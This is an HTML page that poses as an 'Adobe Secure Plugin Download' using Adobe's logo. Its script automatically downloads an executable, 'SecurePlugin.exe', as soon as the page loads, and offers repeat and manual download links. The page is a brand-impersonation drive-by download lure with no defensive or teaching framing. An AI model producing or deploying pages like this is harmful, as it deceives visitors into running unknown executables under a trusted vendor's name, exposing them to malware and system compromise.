<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Adobe Secure Plugin Download</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #eef2ff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }

    .container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.1);
      max-width: 400px;
      width: 100%;
      text-align: center;
    }

    h1 {
      font-size: 1.2rem;
      margin-bottom: 0.5rem;
    }

    p {
      font-size: 0.9rem;
      color: #555;
    }

    .status {
      margin-top: 1rem;
      font-size: 0.95rem;
      padding: 0.5rem;
      border-radius: 6px;
    }

    .status.success {
      background-color: #e0f7e9;
      color: #256029;
    }

    .status.error {
      background-color: #fdecea;
      color: #b91c1c;
    }

    .download-btn {
      margin-top: 1rem;
      padding: 0.5rem 1rem;
      font-size: 0.95rem;
      background-color: #4f46e5;
      color: white;
      border: none;
      border-radius: 6px;
      cursor: pointer;
    }

    .download-btn:hover {
      background-color: #4338ca;
    }

    .manual-link {
      margin-top: 0.5rem;
      display: block;
      font-size: 0.85rem;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://www.adobe.com/federal/assets/svgs/adobe-logo.svg" alt="Adobe Logo" height="40" />
    <h1>Adobe Secure Plugin Download</h1>
    <p>Downloading AdobeSecurePlugin.exe...</p>
    <div id="status" class="status">Checking file availability...</div>
    <button id="downloadBtn" class="download-btn" style="display:none;">Download Again</button>
    <a id="manualLink" class="manual-link" href="AdobeSecurePlugin.exe" download style="display:none;">Manual download link</a>
  </div>

  <script>
    const fileUrl = 'SecurePlugin.exe';
    const status = document.getElementById('status');
    const downloadBtn = document.getElementById('downloadBtn');
    const manualLink = document.getElementById('manualLink');

    function triggerDownload() {
      const link = document.createElement('a');
      link.href = fileUrl;
      link.download = 'SecurePlugin.exe';
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);
    }

    async function checkFileAndDownload() {
      try {
        const res = await fetch(fileUrl, { method: 'HEAD' });
        if (res.ok) {
          status.textContent = 'File is available. Starting download...';
          status.className = 'status success';
          triggerDownload();
          downloadBtn.style.display = 'inline-block';
          manualLink.style.display = 'block';
        } else {
          throw new Error('File not found');
        }
      } catch (e) {
        status.textContent = 'File not available. Please try again later.';
        status.className = 'status error';
        manualLink.style.display = 'block';
      }
    }

    downloadBtn.addEventListener('click', triggerDownload);
    window.addEventListener('DOMContentLoaded', checkFileAndDownload);
  </script>
</body>
</html>
